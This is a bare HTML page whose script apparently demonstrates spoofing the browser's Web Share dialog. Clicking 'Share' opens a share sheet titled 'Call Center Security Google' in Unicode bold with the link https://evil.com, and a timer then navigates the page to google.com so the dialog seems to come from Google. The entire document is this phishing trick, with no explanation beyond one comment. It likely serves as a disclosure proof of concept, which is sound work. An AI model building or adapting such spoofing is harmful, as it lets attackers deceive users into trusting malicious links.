<!doctype html>
<button id="b">Share</button>

<script>
document.getElementById('b').onclick = async () => {
  if (!navigator.share) return;

  // Trigger navigation shortly after share is requested
  setTimeout(() => {
    location.href = 'https://google.com/';
  }, 300);

  await navigator.share({
    title: '𝐂𝐚𝐥𝐥 𝐂𝐞𝐧𝐭𝐞𝐫 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐆𝐨𝐨𝐠𝐥𝐞',
    url: 'https://evil.com'
  });
};
</script>
